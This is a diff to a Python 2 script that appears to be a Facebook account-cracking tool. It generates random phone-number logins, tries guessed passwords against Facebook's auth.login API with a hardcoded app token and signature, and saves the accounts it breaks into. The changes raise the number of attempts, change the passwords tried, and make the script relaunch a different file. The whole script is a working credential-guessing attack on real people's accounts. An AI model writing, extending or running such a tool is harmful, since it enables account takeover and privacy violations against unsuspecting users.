@@ -1,6 +1,6 @@
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
-for n in range(2500):
+for n in range(4500):
     nmbr = random.randint(1111111, 9999999)
     sys.stdout = open('.txt', 'a')
     print nmbr
@@ -233,7 +233,7 @@ def action():
                 cps.close()
                 cpb.append(c + user + pass6)
             else:
-                pass7 = '123123'
+                pass7 = '112233445566'
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
@@ -281,7 +281,7 @@ def action():
                 cps.close()
                 cpb.append(c + user + pass9)
             else:
-                pass10 = '123456789'
+                pass10 = '123456123456'
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
@@ -306,7 +306,7 @@ def action():
     print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
     print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/chk.txt'
     raw_input('\n[Press Enter To Go Back]')
-    os.system('python2 .README.md')
+    os.system('python2 f16.py')
 
 
 if __name__ == '__main__':
